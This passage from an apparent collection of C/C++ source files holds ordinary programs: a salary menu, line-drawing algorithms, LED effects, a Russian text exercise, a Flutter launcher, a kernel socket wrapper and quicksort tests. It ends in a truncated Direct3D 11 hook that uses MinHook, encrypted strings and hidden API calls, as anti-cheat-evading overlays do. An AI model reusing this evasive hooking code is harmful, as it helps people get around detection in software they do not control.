PM\";\n        }\n    }\n\n    void displayBasicInfo() const {\n        cout << \"\\n------ Basic Info ------\\n\";\n        cout << \"ID: \" << id << endl;\n        cout << \"Name: \" << name << endl;\n        cout << \"Shift: \" << shift << \" (\" << startHour << \" to \" << endHour << \")\\n\";\n    }\n\n    virtual void inputDetails() = 0;\n    virtual void showSalary() const = 0;\n};\n\nclass VisitingEmp : public Employee {\nprivate:\n    int days;\n    float wage;\n\npublic:\n    void inputDetails() override {\n        cout << \"Enter Daily Wage: \";\n        cin >> wage;\n        cout << \"Enter Number of Days: \";\n        cin >> days;\n    }\n\n    void showSalary() const override {\n        cout << \"Salary: \" << wage * days << endl;\n    }\n};\n\nclass PermanentEmp : public Employee {\nprivate:\n    int monthlySalary;\n\npublic:\n    void inputDetails() override {\n        cout << \"Enter Monthly Salary: \";\n        cin >> monthlySalary;\n    }\n\n    void showSalary() const override {\n        cout << \"Salary: \" << monthlySalary << \" per month\" << endl;\n    }\n};\n\nint main() {\n    Employee* emp;\n    int choice;\n\n    do {\n        cout << \"\\n------ Menu ------\\n\";\n        cout << \"1. Create Visiting Employee\\n\";\n        cout << \"2. Create Permanent Employee\\n\";\n        cout << \"0. Exit\\n\";\n        cout << \"Choose: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                emp = new VisitingEmp();\n                break;\n            case 2:\n                emp = new PermanentEmp();\n                break;\n            case 0:\n                cout << \"Exiting...\\n\";\n                continue;\n            default:\n                cout << \"Invalid choice, try again.\\n\";\n                continue;\n        }\n\n        if (choice != 0) {\n            emp->inputBasicInfo();\n            emp->inputShift();  // New feature for selecting office shift\n            emp->inputDetails();\n            emp->displayBasicInfo();\n            emp->showSalary();\n            delete emp;\n        }\n\n    } while (choice != 0);\n\n    return 0;\n}\n",
    "#include \"Line.h\"\nRECT Line::rect={0,0,60,30};\nCOLORREF Line::color=RGB(212,73,30);\n\n\n// Bresenham \u7b97\u6cd5\u7ed8\u5236\u76f4\u7ebf\nvoid Bresenham_Line(HDC hdc, POINT A, POINT B, COLORREF color)\n{\n    auto [x1, y1] = A;\n    auto [x2, y2] = B;\n    int dx = abs(x1 - x2), dy = abs(y1 - y2);\n    int sx = (x1 < x2 ? 1 : -1);\n    int sy = (y1 < y2 ? 1 : -1);\n    int err = dx - dy;\n    int x = x1, y = y1;\n\n    while (1)\n    {\n        SetPixel(hdc,x,y,color);\n        if (x == x2 && y == y2)\n            break;\n        int e2 = 2 * err;\n        if (e2 > -dy)\n        {\n            err -= dy;\n            x += sx;\n        }\n        if (e2 < dx)\n        {\n            err += dx;\n            y += sy;\n        }\n    }\n}\n\n// \u4e2d\u70b9\u753b\u7ebf\u6cd5\u7ed8\u5236\u76f4\u7ebf\nvoid MidPoint_Line(HDC hdc, POINT A, POINT B, COLORREF color)\n{\n    auto [x1,y1]=A;\n    auto [x2,y2]=B;\n\tint x = x1, y = y1;\n\tint a = -1*abs(y2 - y1), b = abs(x2 - x1);\n    int sx=(x2>x1 ? 1 : -1);\n    int sy=(y2>y1 ? 1 : -1);\n\n\tint d, d1, d2;\n\tif (-a <= b)\t\t// \u659c\u7387\u7edd\u5bf9\u503c <= 1\n\t{\n\t\td = 2 * a + b;\n\t\td1 = 2 * a;\n\t\td2 = 2 * (a + b);\n\t\twhile(x != x2)\n\t\t{\n\t\t\tif (d < 0)\n\t\t\t\ty += sy, d += d2;\n\t\t\telse\n\t\t\t\td += d1;\n\t\t\tx += sx;\n            SetPixel(hdc,x,y,color);\n\t\t}\n\t}\n\telse\t\t\t\t// \u659c\u7387\u7edd\u5bf9\u503c > 1\n\t{\n\t\td = 2 * b + a;\n\t\td1 = 2 * b;\n\t\td2 = 2 * (a + b);\n\t\twhile(y != y2)\n\t\t{\n\t\t\tif(d < 0)\n\t\t\t\td += d1;\n\t\t\telse\n\t\t\t\tx += sx, d += d2;\n\t\t\ty += sy;\n            SetPixel(hdc,x,y,color);\n\t\t}\n\t}\n}\n\n\nvoid Draw_line(HWND hWnd, vector<POINT> &arr, int state)\n{\n    HDC hdc=GetDC(hWnd);\n    auto A=arr[0], B=arr[1];\n    Line L(A,B);\n\n    if(state == State_macros::Mid_point_line)\n        MidPoint_Line(hdc,A,B,Line::color);\n    if(state == State_macros::Bresenham_line)\n        Bresenham_Line(hdc,A,B,Line::color);\n    if(Thickline == true)\n        if(state == State_macros::Mid_point_line)\n            if(fabs(L.slolpe())>1)\n                for(int i=-2;i<=2;i++)\n                    MidPoint_Line(hdc,POINT{A.x+i,A.y},POINT{B.x+i,B.y},Line::color);\n            else\n                for(int i=-2;i<=2;i++)\n                    MidPoint_Line(hdc,POINT{A.x,A.y+i},POINT{B.x,B.y+i},Line::color);\n        else\n            if(fabs(L.slolpe())>1)\n                for(int i=-2;i<=2;i++)\n                    Bresenham_Line(hdc,POINT{A.x+i,A.y},POINT{B.x+i,B.y},Line::color);\n            else\n                for(int i=-2;i<=2;i++)\n                    Bresenham_Line(hdc,POINT{A.x,A.y+i},POINT{B.x,B.y+i},Line::color);\n    arr.clear();\n\n    string str;\n    Line l1=Line(A,B);\n    str+=to_string(A)+\"  \"+to_string(B)+'\\n';\n    auto Add_point=[&](pair<POINT,POINT> t)     // \u628a\u4ea4\u70b9\u52a0\u5165Cross_points\u4e2d\n    {\n        auto [P,Q]=t;\n        if(l1.left<=P.x && P.x<=l1.right)\n            str+=\"Cross Points: \"+to_string(P)+'\\n',\n            Cross_points.push_back(P);\n        if(l1.left<=P.x && P.x<=l1.right)\n            str+=\"Cross Points: \"+to_string(Q)+'\\n',\n            Cross_points.push_back(Q);\n    };\n    for(auto l2:lines)\n        Add_point(make_pair(Line_cross_line(l1,l2),POINT{-1,-1}));\n    for(auto C:circles)\n        Add_point(Circle_cross_line(C,l1));\n    lines.push_back(l1);\n\n    str+=\"lines :\\n\";\n    for(auto l:lines)\n        str+=\"a=\"+to_string(l.a)+\", b=\"+to_string(l.b)+\", c=\"+to_string(l.c)+'\\n';\n    debug(str);\n}\n\n",
    "#include \"visualisations.h\"\n\nVisualisations::Visualisations(CRGB* ledArray, int numLeds) : leds(ledArray), num_leds(numLeds) { }\n\n\nvoid Visualisations::displayVortex(int* bands)\n{\n  fadeToBlackBy( leds, num_leds, 30);\n\n  // Calculate the overall volume from all bands.\n  int totalVolume = 0;\n  for (int i = 0; i < 9; i++) {\n    totalVolume += bands[i];\n  }\n  int vortexSpeed = map(totalVolume, 0, 2300, 1, 20); // Adjust speed based on volume.\n\n  // Draw the vortex using polar coordinates.\n  for (int radius = 0; radius < 5; radius++) {\n    for (int band = 0; band < 9; band++) {\n      int x = 4 + radius * cos((angle + band * 20) * PI / 180); // Calculate x using cosine.\n      int y = 4 + radius * sin((angle + band * 20) * PI / 180); // Calculate y using sine.\n\n      // Make sure coordinates are within bounds.\n      if (x >= 0 && x < 9 && y >= 0 && y < 9) {\n        int ledIndex = y * 9 + x;\n        leds[ledIndex] = CHSV((band * 28 + radius * 10) % 255, 255, 255);\n      }\n    }\n  }\n\n  angle += vortexSpeed; // Rotate the vortex.\n  angle %= 360; // Keep the angle within 0-360.\n}\n\nvoid Visualisations::displayRippleEffect(int* bands)\n{\n  fadeToBlackBy(leds, num_leds, 60);\n\n  // Iterate over each band.\n  for (int band = 0; band < 9; band++) {\n    int value = bands[band];  // Get the sound value for the band (0-255).\n\n    // Use the value to adjust the ripple's radius.\n    if (value > 50) {  // Trigger a new ripple if the value is above a threshold.\n      rippleRadius[band] = 1; // Reset the radius to start a new ripple.\n    }\n\n    // Update the ripple radius and render it.\n    if (rippleRadius[band] > 0) {\n      drawRipple(band, rippleRadius[band], CHSV(band * 28, 255, 255));\n      rippleRadius[band] += rippleSpeed;  // Increase the radius for the next frame.\n\n      // Fade the ripple out gradually.\n      if (rippleRadius[band] > 9 + rippleDecay) {\n        rippleRadius[band] = 0; // Stop the ripple when it fades out.\n      }\n    }\n  }\n}\n\n// Function to draw a circular ripple.\nvoid Visualisations::drawRipple(int band, int radius, CRGB color)\n{\n  // Calculate the origin of the ripple based on the band.\n  int originX = band; // This spreads the ripple origins along the x-axis.\n  int originY = 4; // Center the ripple vertically at y = 4 (middle row).\n\n  // Iterate over all pixels in the 9x9 grid.\n  for (int y = 0; y < 9; y++) {\n    for (int x = 0; x < 9; x++) {\n      int distance = sqrt(sq(x - originX) + sq(y - originY)); // Calculate distance from the origin.\n      if (distance == radius) { // If the distance matches the radius, color the pixel.\n        int ledIndex = y * 9 + x;\n        leds[ledIndex] = color;\n      }\n    }\n  }\n}\n\nvoid Visualisations::displaySoundReactiveEffect(int* bands)\n{\n  fadeToBlackBy(leds, num_leds, 50);\n\n  // Iterate over each band (column).\n  for (int col = 0; col < 9; col++) {\n    int value = bands[col];  // Get the sound value for the band (0-255).\n\n    // Map the band value to a height (0-9 pixels).\n    int height = map(value, 0, 255, 0, 9);\n\n    // Light up the column from bottom to top.\n    for (int row = 0; row < height; row++) {\n      int ledIndex = (8 - row) * 9 + col;  // Calculate the LED index in the 9x9 matrix.\n      leds[ledIndex] = CHSV(col * 28, 255, 255);  // Use a different color for each column.\n    }\n  }\n}\n\n\nvoid Visualisations::displayRectanglesFromCenter(int* bands)\n{\n  // Fade out previous visuals slightly for a smoother transition.\n  fadeToBlackBy(leds, num_leds, 10);\n\n  // Define the center point and maximum size.\n  int centerX = 4;\n  int centerY = 4;\n  int maxSize = 4; // Maximum size is 4, so we can draw up to 5 rectangles (0-4).\n\n  // Loop over each band and draw a corresponding rectangle from center outward.\n  for (int band = 0; band <= maxSize; band++) {\n    // Calculate the bounds of the current rectangle.\n    int minX = centerX - band;\n    int maxX = centerX + band;\n    int minY = centerY - band;\n    int maxY = centerY + band;\n\n    // Get the brightness or color for this band (based on the band value).\n    uint8_t brightness = bands[band] * 3;\n\n    // Set the color for this rectangle.\n    CRGB color = CHSV(band * 30, 255, brightness);\n\n    // Draw the top and bottom edges of the rectangle.\n    for (int x = minX; x <= maxX; x++) {\n      if (minY >= 0 && minY < 9) leds[minY * 9 + x] = color;  // Top edge.\n      if (maxY >= 0 && maxY < 9) leds[maxY * 9 + x] = color;  // Bottom edge.\n    }\n\n    // Draw the left and right edges of the rectangle.\n    for (int y = minY + 1; y < maxY; y++) { // Avoid double-drawing corners.\n      if (minX >= 0 && minX < 9) leds[y * 9 + minX] = color;  // Left edge.\n      if (maxX >= 0 && maxX < 9) leds[y * 9 + maxX] = color;  // Right edge.\n    }\n  }\n}\n",
    "\ufeff#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <algorithm>\r\n\r\nvoid InputText(std::string& text) {\r\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0435\u043a\u0441\u0442: \";\r\n    while (true) {\r\n        std::getline(std::cin, text);\r\n        if (text.empty()) std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043f\u0443\u0441\u0442\u043e\u0439 \u0442\u0435\u043a\u0441\u0442, \u043f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u0435 \u0432\u0432\u043e\u0434.\" << std::endl;\r\n        else break;\r\n    }\r\n}\r\n\r\nvoid FindTextWords(std::vector<std::string>& words, std::string text) {\r\n    while (!text.empty()) {\r\n        if (text.find(' ') != std::string::npos) {\r\n            words.push_back(text.substr(0, text.find(' ')));\r\n            text = text.erase(0, text.find(' ') + 1);\r\n        }\r\n        else {\r\n            words.push_back(text);\r\n            text.erase(text.begin(), text.end());\r\n        }\r\n    }\r\n}\r\n\r\nvoid WordWithoutPunctuationMarks(const std::vector<std::string>& words, std::vector<std::string>& newWords) {\r\n    for (size_t i = 0; i < words.size(); i++) {\r\n        std::string newWord = \"\";\r\n        std::string word = words[i];\r\n        for (size_t j = 0; j < word.size(); j++) {\r\n            if (std::isalpha(word[j]) || word[j] == '\\'') newWord += word[j];\r\n            else if (!newWord.empty()) {\r\n                    newWords.push_back(newWord);\r\n                    newWord = \"\";\r\n            }\r\n        }\r\n        if (!newWord.empty()) {\r\n            newWords.push_back(newWord);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Solution(std::vector<std::string> words) {\r\n    std::vector<std::string> newWords;\r\n    std::vector<std::string> uniqueWords;\r\n    WordWithoutPunctuationMarks(words, newWords);\r\n    std::cout << \"\u0421\u043b\u043e\u0432\u0430, \u0431\u0443\u043a\u0432\u044b \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043b\u0435\u043a\u0441\u0438\u043a\u043e\u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u0438 \u0443\u043f\u043e\u0440\u044f\u0434\u043e\u0447\u0435\u043d\u044b: \";\r\n    for (size_t i = 0; i < newWords.size(); i++) {\r\n        bool flag = true;\r\n        std::string word = newWords[i];\r\n        for (size_t j = 0; j < word.size() - 1; j++) {\r\n            if (std::isupper(word[j])) word[j] = (int)word[j] + 32;\r\n            if (std::isalpha(word[j]) && std::isalpha(word[j + 1]) && (int)word[j] < (int)word[j + 1] || word[j] == '\\'' && (int)word[j-1] < (int)word[j+1] || word[j + 1] == '\\'' && (int)word[j] < (int)word[j+2]) continue;\r\n            else {\r\n                flag = false;\r\n                break;\r\n            }\r\n        }\r\n        if (flag) {\r\n            std::string currentWord = newWords[i];\r\n            for (size_t i = 0; i < uniqueWords.size(); i++) {\r\n                if (currentWord == uniqueWords[i]) flag = false;\r\n            }\r\n            if (flag) uniqueWords.push_back(currentWord);\r\n        }\r\n    }\r\n    if (uniqueWords.empty()) std::cout << std::endl << \"\u0421\u043b\u043e\u0432, \u0431\u0443\u043a\u0432\u044b \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u0443\u043f\u043e\u0440\u044f\u0434\u043e\u0447\u0435\u043d\u044b \u043b\u0435\u043a\u0441\u0438\u043a\u043e\u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u0438 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e.\";\r\n    else {\r\n        for (size_t i = 0; i < uniqueWords.size(); i++) {\r\n            std::cout << uniqueWords[i] << \" \";\r\n        }\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"ru\");\r\n    std::string text;\r\n    InputText(text);\r\n    std::vector<std::string> words;\r\n    FindTextWords(words, text);\r\n    Solution(words);\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dittojenderamautoworks\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"stdafx.h\"\n#ifdef BZSLIB_KEXT\n#include \"socket.h\"\n\nusing namespace BazisLib;\nusing namespace BazisLib::KEXT;\n\nTCPSocket::TCPSocket( SOCKET hSocket /*= INVALID_SOCKET*/ )\n\t: m_Socket(hSocket)\n{\n}\n\nTCPSocket::TCPSocket(const BazisLib::Network::InternetAddress &addr) \n\t: m_Socket(INVALID_SOCKET)\n{\n\tConnect(addr);\n}\n\nTCPSocket::~TCPSocket()\n{\n\tif (m_Socket != INVALID_SOCKET)\n\t\tsock_close(m_Socket);\n}\n\nsize_t TCPSocket::Send(const void *pBuffer, size_t length, int rawFlags)\n{\n\tif ((m_Socket == INVALID_SOCKET) || !pBuffer)\n\t\treturn 0;\n\tsize_t done = 0;\n\tiovec vec = {(void *)pBuffer, length};\n\tmsghdr hdr = {0,};\n\n\thdr.msg_iovlen = 1;\n\thdr.msg_iov = &vec;\n\n\tsock_send(m_Socket, &hdr, rawFlags, &done);\n\treturn done;\n}\n\nsize_t TCPSocket::Recv(void *pBuffer, size_t length, bool waitUntilEntireBuffer, int rawFlags)\n{\n\tif ((m_Socket == INVALID_SOCKET) || !pBuffer || !length)\n\t\treturn 0;\n\tif (waitUntilEntireBuffer)\n\t\trawFlags |= MSG_WAITALL;\n\n\tsize_t done = 0;\n\tiovec vec = {pBuffer, length};\n\tmsghdr hdr = {0,};\n\n\thdr.msg_iovlen = 1;\n\thdr.msg_iov = &vec;\n\n\tsock_receive(m_Socket, &hdr, rawFlags, &done);\n\treturn done;\n}\n\nActionStatus TCPSocket::Connect(const BazisLib::Network::InternetAddress &address, const BazisLib::Network::InternetAddress &addressToBind)\n{\n\tif (m_Socket == INVALID_SOCKET)\n\t{\n\t\tint err = sock_socket(AF_INET, SOCK_STREAM, 0, NULL, 0, &m_Socket);\n\t\tif (m_Socket == INVALID_SOCKET)\n\t\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\t}\n\tif (addressToBind.Valid())\n\t{\n\t\tint err = sock_bind(m_Socket, addressToBind);\n\t\tif (err)\n\t\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\t}\n\n\tint err = sock_connect(m_Socket, address, 0);\n\tif (err)\n\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\n\treturn MAKE_STATUS(Success);\n}\n\nBazisLib::ActionStatus BazisLib::KEXT::TCPSocket::SetTimeouts( unsigned receiveTimeoutInMsec, unsigned sendTimeoutInMsec /*= 0*/ )\n{\n\tif (m_Socket == INVALID_SOCKET)\n\t\treturn MAKE_STATUS(NotInitialized);\n\n\tif (receiveTimeoutInMsec != -1)\n\t{\n\t\tint err = sock_setsockopt(m_Socket, SOL_SOCKET, SO_RCVTIMEO, (const char *)&receiveTimeoutInMsec, sizeof(unsigned));\n\t\tif (err)\n\t\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\t}\n\tif (sendTimeoutInMsec != -1)\n\t{\n\t\tint err = sock_setsockopt(m_Socket, SOL_SOCKET, SO_SNDTIMEO, (const char *)&sendTimeoutInMsec, sizeof(unsigned));\n\t\tif (err)\n\t\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\t}\n\treturn MAKE_STATUS(Success);\n}\n\nBazisLib::Network::InternetAddress TCPSocket::GetRemoteAddress()\n{\n\tif (!Valid())\n\t\treturn BazisLib::Network::InternetAddress();\n\tunion\n\t{\n\t\tsockaddr_in in4;\n\t\tsockaddr_in6 in6;\n\t\tsockaddr hdr;\n\t} rawaddr;\n\n\tint fromlen = sizeof(rawaddr);\n\tif (sock_getpeername(m_Socket, &rawaddr.hdr, fromlen))\n\t\treturn BazisLib::Network::InternetAddress();\n\treturn BazisLib::Network::InternetAddress(rawaddr.hdr);\n}\n\n\n//----------------------------------------------------------------------------------------------------------------\n\nTCPListener::TCPListener()\n\t: m_Socket(INVALID_SOCKET)\n{\n}\n\nActionStatus TCPListener::Listen(unsigned Port)\n{\n\tint err = sock_socket(AF_INET, SOCK_STREAM, 0, NULL, 0, &m_Socket);\n\tif (m_Socket == INVALID_SOCKET)\n\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\n\tsockaddr_in addr;\n\tmemset(&addr, 0, sizeof(addr));\n\taddr.sin_family = AF_INET;\n\taddr.sin_len = sizeof(sockaddr_in);\n\taddr.sin_port = htons(Port);\n\terr = sock_bind(m_Socket, (sockaddr *)&addr);\n\tif (err)\n\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\terr = sock_listen(m_Socket, SOMAXCONN);\n\tif (err)\n\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\treturn MAKE_STATUS(Success);\n}\n\nTCPListener::~TCPListener()\n{\n\tif (m_Socket != INVALID_SOCKET)\n\t\tsock_close(m_Socket);\n}\n\n\nBazisLib::ActionStatus TCPListener::Accept( TCPSocket *pSocket, Network::InternetAddress *pAddress /*= NULL*/ )\n{\n\tif (!pSocket)\n\t\treturn MAKE_STATUS(InvalidParameter);\n\n\tunion\n\t{\n\t\tsockaddr_in in4;\n\t\tsockaddr_in6 in6;\n\t\tsockaddr hdr;\n\t} rawaddr;\n\n\tint fromlen = sizeof(rawaddr);\n\n\tSOCKET sock = INVALID_SOCKET;\n\tint err = sock_accept(m_Socket, &rawaddr.hdr, fromlen,0, NULL, 0, &sock);\n\tif (sock == INVALID_SOCKET)\n\t\treturn MAKE_STATUS(ActionStatus::FromUnixError(err));\n\tif (pAddress)\n\t\t*pAddress = BazisLib::Network::InternetAddress(rawaddr.hdr);\n\tpSocket->AttachSocket(sock);\n\treturn MAKE_STATUS(Success);\n}\n\nSOCKET TCPListener::Accept()\n{\n\tSOCKET sock;\n\tif (sock_accept(m_Socket, NULL, 0, 0, NULL, 0, &sock) != 0)\n\t\treturn INVALID_SOCKET;\n\telse\n\t\treturn sock;\n}\n\n\n#endif",
    "#include \"../include/quick.sort.h\"\n#include \"../libs/catch2/catch.hpp\"\n#include <vector>\n\nTEST_CASE(\"\u0422\u0435\u0441\u0442\u044b \u0431\u044b\u0441\u0442\u0440\u043e\u0439 \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0438\") {\n  int N = 5;\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {2, 6, 5, 3, 9};\n    quickSort(Array, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041f\u0443\u0441\u0442\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array2[0] = {};\n    quickSort(Array2, 0, 0);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0447\u0438\u0441\u0435\u043b \u0441 \u043f\u043b\u0430\u0432\u0430\u044e\u0449\u0435\u0439 \u0437\u0430\u043f\u044f\u0442\u043e\u0439 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    double Array3[5] = {2.3, 5.0, -1.0, 8.0, -20.0};\n    quickSort(Array3, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array3[i] <= Array3[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0446\u0435\u043b\u044b\u0445 \u0447\u0438\u0441\u0435\u043b \u043f\u043e \u0443\u0431\u044b\u0432\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {2, 6, 5, 3, 9};\n    quickSort(Array, 0, N - 1, false);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] >= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0447\u0438\u0441\u0435\u043b \u0441 \u043f\u043b\u0430\u0432\u0430\u044e\u0449\u0435\u0439 \u0437\u0430\u043f\u044f\u0442\u043e\u0439 \u043f\u043e \u0443\u0431\u044b\u0432\u0430\u043d\u0438\u044e\") {\n    double Array3[5] = {2.3, 5.0, -1.0, 8.0, -20.0};\n    quickSort(Array3, 0, N - 1, false);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array3[i] >= Array3[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0438\u0437 \u043e\u0434\u043d\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\") {\n    int Array[1] = {42};\n    quickSort(Array, 0, 0);\n    REQUIRE(Array[0] == 42);\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {5, 3, 5, 1, 3};\n    quickSort(Array, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u0443\u0436\u0435 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {1, 2, 3, 4, 5};\n    quickSort(Array, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u044b\u043c\u0438 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\u043c\u0438\") {\n    int Array[5] = {5, 5, 5, 5, 5};\n    quickSort(Array, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] == Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441 \u043e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u043c\u0438 \u0447\u0438\u0441\u043b\u0430\u043c\u0438 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int Array[5] = {-3, -1, -7, -5, -2};\n    quickSort(Array, 0, N - 1);\n    for (int i = 0; i < N - 1; i++) {\n      REQUIRE(Array[i] <= Array[i + 1]);\n    }\n  }\n\n  SECTION(\"\u041e\u0447\u0435\u043d\u044c \u0431\u043e\u043b\u044c\u0448\u043e\u0439 \u043c\u0430\u0441\u0441\u0438\u0432 \u043f\u043e \u0432\u043e\u0437\u0440\u0430\u0441\u0442\u0430\u043d\u0438\u044e\") {\n    int              largeN = 100000;\n    std::vector<int> LargeArray(largeN);\n\n    for (int i = 0; i < largeN; ++i) {\n      LargeArray[i] = largeN - i;\n    }\n\n    quickSort(LargeArray.data(), 0, largeN - 1);\n\n    for (int i = 0; i < largeN - 1; i++) {\n      REQUIRE(LargeArray[i] <= LargeArray[i + 1]);\n    }\n  }\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 